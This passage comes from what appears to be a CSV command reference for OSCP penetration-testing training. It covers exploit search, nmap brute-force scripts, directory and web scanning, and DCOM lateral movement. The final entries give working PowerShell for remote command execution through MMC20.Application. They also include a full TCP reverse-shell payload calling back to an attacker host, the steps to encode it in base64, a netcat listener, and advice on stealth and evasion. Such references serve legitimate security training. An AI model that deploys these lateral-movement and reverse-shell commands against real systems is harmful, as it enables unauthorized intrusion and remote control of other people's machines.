2-5 minutes for research, 10-30 minutes for exploit modification.","high","","","","{""No results found"": ""Try broader search: searchsploit <SERVICE_NAME> without CVE"", ""Database outdated"": ""Update with: searchsploit -u (requires internet)"", ""Wrong CVE format"": ""Use format CVE-YYYY-NNNNN (e.g., CVE-2021-44228)"", ""Exploit not in ExploitDB"": ""Try Google: 'CVE-YYYY-NNNNN exploit' or GitHub search""}","{""--cve"": ""Search by CVE identifier in ExploitDB database"", ""-x"": ""Examine exploit code after finding (combine: searchsploit --cve <CVE> -x)"", ""-m"": ""Mirror/copy exploit to current directory"", ""-w"": ""Show exploit-db.com URL for web viewing""}","","[""searchsploit"", ""searchsploit-service-version""]",""
"searchsploit-service-version","Searchsploit Service and Version","exploitation","searchsploit <SERVICE> <VERSION>","Search exploits by service name and version number","general","searchsploit apache 2.4.49","Search strategy:
Start with full version, then try partial (major.minor only).

Exclude noise with --exclude='dos|poc|denial'.

Common OSCP services:
Apache, ProFTPD, vsftpd, Samba, OpenSSH, MySQL, PostgreSQL, IIS, Tomcat.

Read exploit code for:
1) Target OS (Linux/Windows), 2) Authentication required, 3) Dependencies (Python 2 vs 3, libraries), 4) Compilation needed (C code:
gcc exploit.c -o exploit).

Time estimate:
1-3 minutes.","high","","","","{""Too many results"": ""Add version number or use --exclude flag to filter DOS/POC"", ""No results with full version"": ""Try partial version (2.4 instead of 2.4.49)"", ""Wrong service name"": ""Try variations: httpd vs apache, openssh vs ssh"", ""Outdated database"": ""Update: searchsploit -u""}","{""-t"": ""Search only exploit titles (faster, excludes descriptions)"", ""-e"": ""Exact match only (no partial matches)"", ""-s"": ""Strict search (case-sensitive)"", ""-j"": ""JSON output format (useful for scripting)"", ""--exclude"": ""Exclude terms (e.g., --exclude='dos|poc')""}","","[""searchsploit"", ""searchsploit-cve-lookup""]",""
"searchsploit-copy-exploit","Searchsploit Copy Exploit","exploitation","searchsploit -m <EDB_ID>","Copy exploit from ExploitDB to current working directory","general","searchsploit -m 50383","Exploit modification checklist:
1) IP addresses (target and attacker LHOST), 2) Ports (listener LPORT), 3) File paths (uploads, shells), 4) Credentials if needed, 5) Python version (python vs python3), 6) Required libraries (pip install requests beautifulsoup4).

Common modifications for Python exploits:
Change 'import urllib2' to 'import urllib.request' for Python 3.

For C exploits:
Compile with 'gcc -o exploit exploit.c' (add -m32 for 32-bit).

Time estimate:
2-5 minutes to copy and review, 10-30 minutes to modify.","high","","","","{""File not found"": ""Check EDB-ID is correct: searchsploit -x <EDB_ID> first"", ""Permission denied"": ""Change to writable directory: cd ~/oscp/exploits"", ""Wrong exploit copied"": ""List directory: ls -la to verify filename"", ""Python version mismatch"": ""Check shebang: head -1 <FILE> (#!/usr/bin/python vs python3)""}","{""-m"": ""Mirror exploit to current directory (copies file)"", ""-p"": ""Copy to specific path: searchsploit -m <ID> -p /path/to/dir"", ""Path syntax"": ""Can use full path: /usr/share/exploitdb/exploits/linux/remote/50383.py""}","","[""searchsploit"", ""searchsploit-cve-lookup"", ""searchsploit-service-version""]",""
"nmap-script-help","Nmap Script Documentation","exploitation","nmap --script-help <SCRIPT_NAME>","Display NSE script documentation and usage examples","general","nmap --script-help http-vuln-*","NSE script categories:
'auth' (authentication bypass/brute), 'brute' (password guessing), 'default' (standard enumeration), 'discovery' (network discovery), 'dos' (denial of service - AVOID IN OSCP), 'exploit' (vulnerability exploitation), 'external' (requires internet), 'fuzzer' (fuzzing), 'intrusive' (may crash services), 'malware' (malware detection), 'safe' (non-intrusive), 'version' (version detection), 'vuln' (vulnerability checking).

OSCP-safe categories:
safe, default, vuln, discovery.

Useful script patterns:
http-vuln-* (web vulns), smb-vuln-* (SMB vulns), ftp-* (FTP enum), ssh-* (SSH enum).

Time estimate:
1-2 minutes to read docs.","high","","","","{""Script not found"": ""List available scripts: ls /usr/share/nmap/scripts/ | grep <NAME>"", ""Too much output"": ""Use specific script name instead of wildcard"", ""Script requires args"": ""Check 'Arguments:' section in help output"", ""Outdated scripts"": ""Update NSE database: nmap --script-updatedb""}","{""--script-help"": ""Show detailed script documentation"", ""Wildcards"": ""Use * for multiple scripts (e.g., http-* shows all HTTP scripts)"", ""Categories"": ""Use category names: vuln, exploit, auth, brute, discovery, safe, intrusive""}","","[""nmap-script-args"", ""nmap-vuln-scan""]",""
"nmap-script-args","Nmap Script with Arguments","exploitation","sudo nmap -sV -Pn -v --script <SCRIPT_NAME> --script-args <ARGUMENTS> -p <PORT> <TARGET>","Execute NSE script with custom arguments for targeted enumeration","general","sudo nmap -sV -Pn -v --script http-form-brute --script-args userdb=users.txt,passdb=passwords.txt -p 80 192.168.45.100","Common OSCP NSE scripts with args:
1) http-form-brute:
--script-args 'userdb=users.txt,passdb=pass.txt,http-form-brute.path=/login.php,http-form-brute.method=POST' 2) smb-brute:
--script-args userdb=users.txt,passdb=pass.txt 3) ftp-brute:
--script-args userdb=users.txt,passdb=pass.txt 4) ssh-brute:
--script-args userdb=users.txt,passdb=pass.txt 5) mysql-brute:
--script-args userdb=users.txt,passdb=pass.txt.

Always test scripts safely:
Use --script-args 'safe=1' when available.

Time estimates:
brute scripts (5-60 minutes depending on wordlist), vuln scripts (30 seconds - 2 minutes), enum scripts (1-5 minutes).

Exam tip:
Avoid DOS category scripts, they may crash targets.","high","","","","{""Invalid arguments"": ""Check required format with --script-help <SCRIPT_NAME>"", ""Script not executing"": ""Verify script exists: ls /usr/share/nmap/scripts/<SCRIPT>.nse"", ""No output"": ""Add -d flag for debug output: nmap -d --script ..."", ""Permission errors"": ""Use sudo for privileged operations"", ""Script hanging"": ""Add timeout: --script-timeout=30s""}","{""--script"": ""Specify NSE script(s) to run"", ""--script-args"": ""Pass arguments to scripts (format: key=value,key2=value2)"", ""-sV"": ""Service version detection (required for many scripts)"", ""-Pn"": ""Skip ping check (assume host is up)"", ""-v"": ""Verbose output (see progress and details)"", ""sudo"": ""Required for raw packet manipulation and low ports""}","","[""nmap-script-help"", ""nmap-vuln-scan""]",""
"gobuster-dir-common","Gobuster Directory Common Wordlist","exploitation","gobuster dir -u http://<TARGET>:<PORT> -w /usr/share/wordlists/dirb/common.txt -t <THREADS> -x <EXTENSIONS>","Fast directory brute force with common wordlist (4600 entries)","general","gobuster dir -u http://192.168.45.100:80 -w /usr/share/wordlists/dirb/common.txt -t 30 -x php,html,txt","Wordlist sizes and time estimates (30 threads):
1) common.txt (4,614 entries) - 2-5 minutes, 2) directory-list-2.3-small.txt (87,664) - 10-20 minutes, 3) directory-list-2.3-medium.txt (220,560) - 30-60 minutes, 4) big.txt (20,469) - 5-10 minutes.

Extension strategy:
Linux (php,html,txt,sh), Windows (asp,aspx,html,txt), Java (jsp,jspa,do,action).

OSCP exam tip:
Start with common.txt first (quick wins), then run medium wordlist in background.

Status code meanings:
200=accessible, 301/302=redirect (follow), 401=auth required (bruteforce?), 403=forbidden (try bypass with encodings or methods), 500=server error (potential injection?).

Thread optimization:
Exam network may have rate limits, test with 10 threads first, increase to 30-50 if stable.","high","","","","{""Connection timeout"": ""Reduce threads: -t 10, increase timeout: --timeout 30s"", ""Too many 404s"": ""Try different wordlist, check URL is correct"", ""Rate limited"": ""Reduce threads, add delay: --delay 100ms"", ""SSL errors"": ""Add -k flag for self-signed certificates"", ""No results"": ""Try different extensions: -x php,html,txt,asp,aspx,jsp""}","{""dir"": ""Directory/file enumeration mode"", ""-u"": ""Target URL (include http:// or https://)"", ""-w"": ""Wordlist file path"", ""-t"": ""Number of concurrent threads (default 10, max 50 for OSCP)"", ""-x"": ""File extensions to append to wordlist entries"", ""-o"": ""Output file (add: -o gobuster_results.txt)"", ""-k"": ""Skip SSL certificate verification (for HTTPS)"", ""-s"": ""Status codes to display (default: 200,204,301,302,307,401,403)""}","","[""gobuster-dir-custom"", ""gobuster-dir""]",""
"gobuster-dir-custom","Gobuster Directory Custom Deep Scan","exploitation","gobuster dir -u http://<TARGET>:<PORT> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t <THREADS> -x <EXTENSIONS> -b <BLACKLIST> -o <OUTPUT>","Deep directory enumeration with large wordlist and filtering","general","gobuster dir -u http://192.168.45.100:80 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30 -x php,html,txt,bak -b 404,403 -o gobuster_deep.txt","Wordlist selection strategy:
1) Start with common.txt (quick wins, 2-5 min), 2) Run directory-list-2.3-small.txt (medium depth, 10-20 min), 3) If time permits:
directory-list-2.3-medium.txt (deep scan, 30-60 min).

Extension strategy by platform:
Apache/Linux (php,txt,html,sh,bak), IIS/Windows (asp,aspx,config,txt,bak), Tomcat/Java (jsp,do,action,war), Generic (html,txt,zip,tar,gz,sql,log).

Status code interpretation:
200 (access granted - investigate), 301/302 (redirect - follow with -r), 401 (auth required - potential brute force), 403 (forbidden - try bypass techniques:
path traversal, case manipulation, method change), 500 (server error - may indicate injection point).

OSCP exam strategy:
Run medium wordlist in background (tmux/screen), focus on quick wins first, return to deep scan results after initial enum.

Time management:
Allocate 30-60 minutes max for deep scans, move on if not productive.","medium","","","","{""Scan too slow"": ""Increase threads (-t 50) or use smaller wordlist"", ""Connection errors"": ""Reduce threads (-t 10), add delay (--delay 100ms)"", ""Rate limited"": ""Add --delay 200ms or reduce threads"", ""Too much output"": ""Exclude status codes: -b 404,403,500"", ""Missing results"": ""Try without -x flag (no extensions), then add specific ones""}","{""-w /path/to/wordlist"": ""Wordlist selection: small (87K), medium (220K), large (1M+)"", ""-t"": ""Threads (balance speed vs stability)"", ""-x"": ""Extensions to test (reduces false negatives)"", ""-b"": ""Blacklist status codes (hide noise: 404, 403)"", ""-o"": ""Save output to file (important for long scans)"", ""-r"": ""Follow redirects (useful for finding real targets)"", ""-k"": ""Skip SSL verification"", ""--timeout"": ""Request timeout in seconds (default 10s)"", ""--delay"": ""Delay between requests (ms) for rate limiting""}","","[""gobuster-dir-common"", ""gobuster-dir""]",""
"nikto-comprehensive","Nikto Web Vulnerability Scanner","exploitation","nikto -h http://<TARGET>:<PORT> -C all -output <OUTPUT>","Comprehensive web server vulnerability and misconfiguration scanner","general","nikto -h http://192.168.45.100:80 -C all -output nikto_results.txt","Nikto scan characteristics:
1) Noisy - generates significant log entries (IDS/IPS will detect), 2) Comprehensive - checks 6700+ items, 3) Slow - 10-20 minutes typical, 4) False positives - always verify findings manually.

OSCP exam considerations:
Run AFTER manual enumeration and gobuster (nikto is noisy), Run in background (tmux/screen session), Focus on findings that match target OS/service versions, Ignore generic findings (e.g., 'X-Frame-Options missing' unless relevant).

Tuning options:
1 (Interesting files), 2 (Misconfiguration), 3 (Info disclosure), 4 (Injection:
XSS/SQLi/etc), 5 (Remote file retrieval), 6 (Denial of service - AVOID), 7 (Remote file retrieval), 8 (Command execution), 9 (SQL injection), 0 (File upload), a (Authentication bypass), b (Software identification), c (Remote source inclusion).

Recommended tuning:
-Tuning 1,2,3,4,8,b (skip DOS).

Time estimate:
Full scan 10-20 minutes, Tuned scan 5-10 minutes.

Post-scan workflow:
grep OSVDB/CVE  searchsploit  manual verification  exploitation.","high","","","","{""Scan too slow"": ""Use tuning: -Tuning 1,2 (skip time-consuming checks)"", ""SSL errors"": ""Add -ssl or -nossl as appropriate"", ""Too many false positives"": ""Use -Tuning x (reverse tuning, skip specific checks)"", ""Connection timeouts"": ""Target may have IDS/IPS, reduce scan intensity"", ""Incomplete results"": ""Ensure output file has write permissions""}","{""-h"": ""Target host (URL with protocol: http:// or https://)"", ""-C all"": ""Run all vulnerability checks (comprehensive scan)"", ""-output"": ""Save results to file (important for long scans)"", ""-Format"": ""Output format: txt, html, xml, csv (default txt)"", ""-Tuning"": ""Tuning options: 1=interesting, 2=misc, 3=info disclosure, 4=injection, x=reverse tuning"", ""-ssl"": ""Force SSL mode for HTTPS targets"", ""-nossl"": ""Disable SSL (for HTTP only)"", ""-Plugins"": ""Specific plugins to run (e.g., -Plugins apacheusers)""}","","[""nikto-scan"", ""gobuster-dir-common"", ""whatweb-technology-detection""]",""
"dcom-verify-rpc-port","DCOM - Verify RPC Port 135 Accessible","active-directory","Test-NetConnection <TARGET> -Port 135","Test RPC port 135 accessibility for DCOM lateral movement using Test-NetConnection from PowerShell","lateral-movement","Test-NetConnection 192.168.50.73 -Port 135","OSCP TRAINING MATERIAL - DCOM RPC PORT VERIFICATION:
WHAT IS DCOM:
Distributed Component Object Model - Microsoft technology enabling software components to communicate across networked computers.

Allows remote COM object instantiation and method invocation over RPC.

PORT REQUIREMENTS (CRITICAL):
- TCP 135:
RPC endpoint mapper (required for initial connection)
- TCP 49152-65535:
Ephemeral/dynamic ports (actual DCOM communication)
- Both ranges must be accessible for DCOM to work

WHY VERIFY PORT 135:
From training context, before attempting DCOM lateral movement, verify RPC accessibility:
```powershell
Test-NetConnection 192.168.50.73 -Port 135
```

If TcpTestSucceeded:
True  DCOM possible
If TcpTestSucceeded:
False  DCOM blocked, use alternative (WMI, WinRM, PSExec)

RPC ENDPOINT MAPPER ROLE:
Port 135 is RPC endpoint mapper:
1.

Client connects to port 135
2.

Requests service (e.g., DCOM)
3.

Mapper returns dynamic port number (49152-65535 range)
4.

Client connects to dynamic port for actual communication

DCOM vs WMI:
Both use RPC (port 135) but different protocols:
- WMI:
Windows Management Instrumentation over DCOM/RPC
- DCOM:
Direct COM object manipulation over RPC
- Different security contexts and logging
- DCOM alternative when WMI specifically blocked/monitored

FIREWALL BEHAVIOR:
Windows Firewall rules:
- Domain networks:
RPC allowed by default
- Public/Private networks:
Often blocked
- OSCP exam:
Typically domain environment (RPC accessible)

VERIFICATION OUTPUT:
Success:
```
ComputerName     :
192.168.50.73
RemoteAddress    :
192.168.50.73
RemotePort       :
135
TcpTestSucceeded :
True
```

Failure:
```
TcpTestSucceeded :
False
PingSucceeded    :
True/False
```

TIME ESTIMATE:
<10 seconds.

EXAM STRATEGY:
Always verify port 135 before attempting DCOM to avoid wasting time.","medium","","","","{""TcpTestSucceeded False"": ""Firewall blocking RPC - DCOM won't work. Verify with: sudo nmap -p 135 -Pn -v <TARGET>"", ""Connection timeout"": ""Port filtered or target unreachable. Check basic connectivity: ping <TARGET>"", ""Network unreachable"": ""Routing issue. Verify route: Test-NetConnection <TARGET> without -Port"", ""Port closed"": ""RPC service disabled (unlikely on Windows Server). Try alternative: WinRM (5985)""}","{""Test-NetConnection"": ""PowerShell cmdlet for testing network connectivity"", ""-Port 135"": ""RPC endpoint mapper port (required for DCOM communication)""}","","",""
"dcom-mmc20-calc-poc","DCOM - MMC20.Application Calculator PoC","active-directory","$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID(""MMC20.Application.1"",""<TARGET>"")); $dcom.Document.ActiveView.ExecuteShellCommand(""cmd"",$null,""/c calc"",""7"")","Execute calculator on remote system via DCOM MMC20.Application (proof-of-concept test before deploying reverse shell)","lateral-movement","$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID(""MMC20.Application.1"",""192.168.50.73"")); $dcom.Document.ActiveView.ExecuteShellCommand(""cmd"",$null,""/c calc"",""7"")","OSCP TRAINING MATERIAL - DCOM LATERAL MOVEMENT WITH MMC20.APPLICATION:
TRAINING EXAMPLE (EXACT COMMAND FROM OSCP MODULE):
From CLIENT74 as jen (domain user, local admin on FILES04), executing calculator on FILES04 (192.168.50.73):
```powershell
PS C:\Users\jen> $dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID(""MMC20.Application.1"",""192.168.50.73""))
PS C:\Users\jen> $dcom.Document.ActiveView.ExecuteShellCommand(""cmd"",$null,""/c calc"",""7"")
```

No errors returned = success.

WHAT IS DCOM LATERAL MOVEMENT:
Technique using Distributed Component Object Model to instantiate COM objects remotely and execute commands on target systems.

Alternative to WMI/WinRM/PSExec for lateral movement.

WHY USE DCOM:
- Alternative when WMI specifically blocked/monitored
- Different attack vector (evasion)
- No service creation (unlike PSExec)
- Fileless execution (no binary upload)
- Uses legitimate Windows functionality

MMC20.APPLICATION COM OBJECT:
Microsoft Management Console (MMC) exposes automation interface:
- ProgID:
MMC20.Application.1
- Purpose:
Legitimate MMC scripting/automation
- Method:
Document.ActiveView.ExecuteShellCommand
- Abuse:
Remote command execution

DISCOVERY:
- Researcher:
Matt Nelson (@enigma0x3)
- Year:
2017
- Documentation:
Cybereason, Enigma0x3 blog
- Multiple DCOM objects identified for lateral movement

TRAINING SCENARIO CONTEXT:
- SOURCE:
CLIENT74 (compromised Windows client)
- ATTACKER:
jen (domain user with local admin rights on FILES04)
- TARGET:
FILES04 (192.168.50.73) - Windows Server
- GOAL:
Proof-of-concept command execution via DCOM

HOW MMC20 DCOM WORKS:
Step 1:
CreateInstance
```powershell
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID(""MMC20.Application.1"",""192.168.50.73""))
```
- System.Activator:
.NET class for COM activation
- CreateInstance:
Instantiates COM object
- GetTypeFromProgID:
Converts ProgID to Type
- ""MMC20.Application.1"":
MMC COM class identifier
- ""192.168.50.73"":
Target IP/hostname

Result:
$dcom variable contains remote MMC object reference.

Step 2:
ExecuteShellCommand
```powershell
$dcom.Document.ActiveView.ExecuteShellCommand(""cmd"",$null,""/c calc"",""7"")
```
- Document:
MMC Document interface
- ActiveView:
Active console view
- ExecuteShellCommand:
Method to run shell commands
- Four parameters:
  1.

""cmd"":
Command interpreter
  2.

$null:
Working directory (null = default)
  3.

""/c calc"":
Command arguments (run calculator then exit)
  4.

""7"":
Window state (7=minimized, 0=hidden, 1=normal)

Result:
Calculator spawns on FILES04.

SESSION 0 BEHAVIOR (CRITICAL UNDERSTANDING):
From training, calculator NOT visible on FILES04 desktop because:
Session Isolation:
- Session 0:
System services, non-interactive processes
- Session 1+:
User desktop sessions (interactive)
- DCOM spawns processes in Session 0
- GUI applications invisible to logged-in users

Training explicitly states:
""Unfortunately, we won't see calc.exe starting since the process is spawned in session 0.""

VERIFICATION:
From training, confirm execution via remote PowerShell:
```powershell
PS C:\Users\jen> Invoke-Command -ComputerName 192.168.50.73 -ScriptBlock {Get-Process calc}

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
    141       8     7924      21292       0.11   4724   0 calc
```

SI (Session ID) = 0 confirms Session 0 execution.

Alternative verification:
```powershell
tasklist /S 192.168.50.73 | findstr calc
```

PREREQUISITES (FROM TRAINING):
1.

Local administrator access on target
   - jen was local admin on FILES04
   - Verify with:
net user jen /domain
2.

RPC port 135 accessible
   - Test:
Test-NetConnection 192.168.50.73 -Port 135
3.

Ephemeral ports accessible (49152-65535)
   - Windows Firewall allows by default in domain environments

PORT DETAILS:
- TCP 135:
RPC endpoint mapper (initial connection)
- TCP 49152-65535:
Dynamic ports (actual DCOM communication)
- Same ports as WMI (both use DCOM/RPC)

WHY CALCULATOR AS PoC:
From training methodology:
1.

Harmless - won't damage target
2.

Easy to verify - check process list
3.

Confirms technique works before deploying reverse shell
4.

Standard penetration testing practice

FOUR EXECUTESHELLCOMMAND PARAMETERS:
Parameter 1:
Command
- Examples:
""cmd"", ""powershell"", ""C:\\Windows\\System32\\cmd.exe""
- Training used:
""cmd""

Parameter 2:
Directory
- Working directory for command
- $null = default (C:\Windows\System32 typically)
- Can specify custom:
""C:\\Temp""

Parameter 3:
Parameters
- Command arguments
- Training:
""/c calc"" (run calc then exit cmd)
- Reverse shell:
""powershell -nop -w hidden -e <BASE64>""

Parameter 4:
WindowState
- 0:
Hidden
- 1:
Normal
- 7:
Minimized
- Training used:
""7"" (minimized, though invisible in Session 0 anyway)

BEHIND THE SCENES:
1.

PowerShell contacts RPC endpoint mapper (port 135) on target
2.

Requests DCOM service
3.

RPC mapper returns dynamic port
4.

DCOM connection established on dynamic port
5.

MMC20 COM object instantiated remotely
6.

ExecuteShellCommand invoked via DCOM
7.

Target spawns cmd.exe process in Session 0
8.

cmd.exe runs /c calc (calculator)
9.

Process remains running until manually terminated

COMPARISON TO OTHER TECHNIQUES:
PSExec:
- Uploads binary (psexesvc.exe)
- Creates service
- SYSTEM shell
- Noisy (Event ID 7045)

WMI:
- Uses WMI protocol
- Fileless
- Session 0 execution
- Different API calls

DCOM MMC20:
- Uses DCOM protocol
- Fileless
- Session 0 execution
- Different signature than WMI
- Alternative vector for evasion

TIME ESTIMATE:
- Command execution:
10-30 seconds
- Verification:
10-20 seconds
- Total:
1-2 minutes

EXAM STRATEGY:
1.

Always test with calculator PoC first
2.

Verify process created (Invoke-Command Get-Process)
3.

If PoC succeeds, upgrade to reverse shell
4.

If PoC fails, troubleshoot before wasting time on payload

COMMON FAILURES:
Exception calling CreateInstance:
- RPC unavailable:
Check port 135
- DCOM disabled:
Try alternative (WMI, WinRM)
- Firewall blocking:
Verify ephemeral ports

Access denied:
- Not local admin:
Verify permissions
- UAC blocking:
Use RID 500 or domain user

No error but calc not running:
- May have succeeded but Session 0
- Always verify with Get-Process, not GUI

FORENSIC ARTIFACTS:
- Event ID 4688:
Process creation (calc.exe)
- RPC network traffic on port 135
- DCOM activation (Event ID 10016 if blocked)
- Process spawned by svchost.exe (DCOM host)
- No service creation events (unlike PSExec)","high","","","","{""RPC server unavailable"": ""Port 135 blocked. Verify with: Test-NetConnection <TARGET> -Port 135"", ""Access denied"": ""Need local admin rights on target. Test with: crackmapexec smb <TARGET> -u <USER> -p <PASS>"", ""CreateInstance fails"": ""DCOM may be disabled or firewall blocking high ports. Check Windows Firewall on target"", ""Calculator not visible"": ""Expected behavior - process runs in Session 0 (system services). Verify with: Invoke-Command -ComputerName <TARGET> {Get-Process calc}"", ""COM class factory failed"": ""MMC20.Application not registered. Try alternative: dcom-shellwindows""}","{""[System.Activator]::CreateInstance"": ""Instantiate COM object remotely via DCOM"", ""GetTypeFromProgID"": ""Retrieve COM class by ProgID (MMC20.Application.1)"", ""\""MMC20.Application.1\"""": ""MMC DCOM class identifier"", ""Document.ActiveView.ExecuteShellCommand"": ""MMC method to execute shell commands remotely"", ""\""cmd\"""": ""Command interpreter to use"", ""$null"": ""Directory parameter (null = default working directory)"", ""\""/c calc\"""": ""Execute calculator then exit cmd.exe"", ""\""7\"""": ""WindowState (7 = minimized, 0 = hidden, 1 = normal)""}","","",""
"dcom-mmc20-revshell","DCOM - MMC20.Application Reverse Shell","active-directory","$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID(""MMC20.Application.1"",""<TARGET>"")); $dcom.Document.ActiveView.ExecuteShellCommand(""powershell"",$null,""powershell -nop -w hidden -e <BASE64_PAYLOAD>"",""7"")","Deploy base64-encoded PowerShell reverse shell via DCOM MMC20.Application for interactive remote access","lateral-movement","$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID(""MMC20.Application.1"",""192.168.50.73"")); $dcom.Document.ActiveView.ExecuteShellCommand(""powershell"",$null,""powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0AC..."",""7"")","OSCP TRAINING MATERIAL - DCOM REVERSE SHELL VIA MMC20.APPLICATION:
TRAINING EXAMPLE (FROM OSCP MODULE):
After successful calculator PoC, training demonstrates upgrading to reverse shell:
```powershell
PS C:\Users\jen> $dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID(""MMC20.Application.1"",""192.168.50.73""))
PS C:\Users\jen> $dcom.Document.ActiveView.ExecuteShellCommand(""powershell"",$null,""powershell -nop -w hidden -e <BASE64_PAYLOAD>"",""7"")
```

Before execution, Netcat listener set up on Kali:
```bash
kali$ nc -lvnp 443
listening on [any] 443 ...
```

After DCOM command, reverse shell connects:
```
connect to [192.168.119.5] from (UNKNOWN) [192.168.50.73] 51138
PS C:\Windows\system32>
```

WHAT IS DCOM REVERSE SHELL:
Combines DCOM lateral movement with base64-encoded PowerShell reverse shell payload for full interactive remote access from attacker's machine.

UPGRADE FROM PoC:
Calc PoC:
`/c calc` (proof technique works)
Reverse shell:
`powershell -nop -w hidden -e <BASE64>` (full shell access)

PAYLOAD STRUCTURE:
From training context:
```powershell
""powershell -nop -w hidden -e <BASE64_PAYLOAD>""
```

Flags:
- -nop:
No PowerShell profile (faster, stealthier)
- -w hidden:
Hidden window (no visible console)
- -e:
Encoded command (base64-encoded reverse shell)

BASE64 PAYLOAD:
Example reverse shell PowerShell (before encoding):
```powershell
$client = New-Object System.Net.Sockets.TCPClient(""192.168.119.5"",443);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
  $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
  $sendback = (iex $data 2>&1 | Out-String );
  $sendback2 = $sendback + ""PS "" + (pwd).Path + ""> "";
  $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
  $stream.Write($sendbyte,0,$sendbyte.Length);
  $stream.Flush()
};
$client.Close()
```

Convert to base64:
```powershell
$Text = '$client = New-Object...(full payload)...'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
$EncodedText = [Convert]::ToBase64String($Bytes)
$EncodedText
```

LISTENER SETUP:
From training, before executing DCOM command:
```bash
nc -lvnp 443
```

- nc:
Netcat
- -l:
Listen mode
- -v:
Verbose
- -n:
No DNS resolution
- -p 443:
Port 443 (common for evasion - looks like HTTPS)

REVERSE SHELL FLOW:
1.

Attacker:
Set up Netcat listener on Kali (nc -lvnp 443)
2.

Attacker:
Execute DCOM command from CLIENT74
3.

DCOM:
Instantiates MMC20 on FILES04
4.

MMC20:
Spawns PowerShell process on FILES04
5.

PowerShell:
Decodes base64 payload
6.

PowerShell:
Executes decoded script
7.

Script:
Creates TCP connection from FILES04 to Kali:443
8.

Connection:
Reverse shell established
9.

Attacker:
Interactive PowerShell on FILES04

PORT SELECTION:
- Training used:
443 (HTTPS)
- Common choices:
443, 80, 53 (blend with normal traffic)
- Avoid:
Non-standard ports (easier to detect)
- Firewall consideration:
Outbound 443/80 usually allowed

SESSION 0 CONTEXT:
- Reverse shell runs in Session 0 (system services)
- Not visible to logged-in users
- No GUI console window
- Process parent:
svchost.exe (DCOM host)

EXECUTION PRIVILEGES:
- Shell runs as:
jen (user who has local admin on FILES04)
- Not SYSTEM (unlike PSExec)
- User-level privileges
- Can potentially escalate to SYSTEM

WHY USE DCOM OVER ALTERNATIVES:
- WMI blocked/monitored:
DCOM different protocol/signature
- WinRM not enabled:
DCOM uses RPC instead
- PSExec too noisy:
DCOM no service creation
- Evasion:
Different attack vector

COMPARISON:
PSExec (Impacket/Sysinternals):
- Can execute from Kali or Windows
- SYSTEM shell
- Service creation (Event ID 7045)
- Binary upload (psexesvc.exe)
- Very well-known signature

DCOM MMC20:
- Requires Windows pivot point
- User shell (jen)
- No service creation
- Fileless (no binary upload)
- Less common signature

STEALTH BENEFITS:
- No binary written to disk
- No service creation
- Encoded payload (reduces AV signatures)
- Legitimate DCOM/MMC usage (harder to detect)
- Process appears as normal PowerShell

DISADVANTAGES:
- Requires compromised Windows host (can't run from Kali)
- More complex than PSExec
- User-level shell (not SYSTEM)
- Depends on PowerShell not being blocked

TIME ESTIMATE:
- Payload generation:
2-3 minutes
- Listener setup:
30 seconds
- DCOM execution:
30-60 seconds
- Total:
3-5 minutes

EXAM STRATEGY:
1.

Pre-generate base64 payloads before exam
2.

Test calculator PoC first
3.

If calc succeeds, deploy reverse shell
4.

Set up listener BEFORE executing DCOM command
5.

Verify LHOST/LPORT match payload
6.

If connection fails, check firewall/payload

PAYLOAD GENERATION TOOLS:
- revshells.com (online generator)
- PowerShell manual encoding
- Metasploit:
msfvenom -p windows/x64/shell_reverse_tcp

COMMON FAILURES:
No callback received:
- Wrong LHOST/LPORT in payload
- Listener not running
- Outbound firewall blocking
- Payload execution failed

Verify payload:
```powershell
[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('<BASE64>'))
```

Connection drops immediately:
- Syntax error in payload
- PowerShell execution policy blocking
- AV detection

FORENSIC ARTIFACTS:
- Event ID 4688:
PowerShell process creation
- Network connection:
FILES04  Kali:443
- PowerShell process:
Parent svchost.exe (DCOM)
- No service creation (unlike PSExec)
- RPC traffic on port 135
- DCOM activation events","high","","","","{""No callback received"": ""Verify LHOST/LPORT in payload match listener. Decode payload: [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('<BASE64>'))"", ""RPC unavailable"": ""Check firewall: Test-NetConnection <TARGET> -Port 135"", ""Payload execution blocked"": ""Antivirus may be blocking PowerShell. Try obfuscation or alternative technique"", ""Access denied"": ""Verify admin rights: crackmapexec smb <TARGET> -u <USER> -p <PASS> (look for Pwn3d!)"", ""Connection drops immediately"": ""Payload syntax error. Test payload locally first: powershell -nop -w hidden -e <BASE64>"", ""Firewall blocking callback"": ""Test outbound connectivity from target: Test-NetConnection <LHOST> -Port <LPORT>""}","{""CreateInstance"": ""Instantiate remote COM object via DCOM"", ""MMC20.Application.1"": ""MMC DCOM class (ProgID)"", ""ExecuteShellCommand"": ""Method to execute shell commands remotely"", ""\""powershell\"""": ""Command interpreter (PowerShell instead of cmd)"", ""-nop"": ""No PowerShell profile (faster execution, stealthier)"", ""-w hidden"": ""Hidden window (no visible PowerShell console)"", ""-e <BASE64>"": ""Encoded command - executes base64-encoded payload"", ""\""7\"""": ""Minimized window state (invisible in Session 0 anyway)""}","","[""psexec-impacket-shell""]",""
